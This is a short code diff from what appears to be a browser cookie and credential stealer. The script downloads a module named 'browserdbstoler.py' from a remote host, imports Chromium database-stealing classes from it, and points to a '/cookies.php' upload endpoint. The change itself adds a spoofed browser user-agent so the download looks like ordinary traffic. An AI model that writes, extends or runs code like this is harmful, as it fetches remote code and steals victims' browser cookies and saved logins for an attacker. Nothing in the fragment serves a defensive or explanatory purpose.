@@ -8,6 +8,9 @@ POST_URI = str(f"{HOST}/cookies.php")
 DOWNLOAD_BIN = str(f"{HOST}/browserdbstoler.py")
 
 if not os.path.isfile("browserdbstoler.py"):
+    opener = urllib.request.build_opener()
+    opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+    urllib.request.install_opener(opener)
     urllib.request.urlretrieve(DOWNLOAD_BIN, "browserdbstoler.py")
 
 from browserdbstoler import BDBS_Chromium, Chromium
